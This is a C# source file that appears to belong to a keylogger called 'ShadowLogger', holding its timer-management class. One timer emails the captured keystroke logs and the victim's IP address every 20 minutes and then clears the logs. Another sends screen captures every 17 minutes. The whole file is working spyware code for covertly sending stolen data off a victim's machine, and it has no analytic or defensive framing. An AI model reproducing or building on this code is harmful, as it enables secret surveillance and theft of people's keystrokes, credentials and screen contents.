using System;
using ShadowLogger.bin.HelperMethods;
using ShadowLogger.bin.Shared_Methods;

namespace ShadowLogger.bin.Timers_Management
{
    internal static class TimersHandling
    {
        private static readonly System.Timers.Timer MainTmr = new System.Timers.Timer {Interval = 1200000, Enabled = true}; //20minutes.
        private static readonly System.Timers.Timer PrintScreenTmr = new System.Timers.Timer {Interval = 1020000, Enabled = true}; //17minutes.
        
        internal static void InitializeTimers()
        {
            MainTmr.Elapsed += Main_Elapsed;
            PrintScreenTmr.Elapsed += PrintScreen_Elapsed;
        }

        private static void Main_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (GlobalVariables.GlobalVariables.MainData.Length == 0) return;

            if (GlobalVariables.GlobalVariables.HostIp == string.Empty)
            {
                HostInfo.HostInfo.GetIp();
            }

            SharedMethods.SendMail(string.Format(SharedMethods.GetMailSubject(), " - Logs of ### "));
            SharedMethods.ClearLogs();
        }

        private static void PrintScreen_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            HelperMethods.PrintAndSend();
        }
    }
}
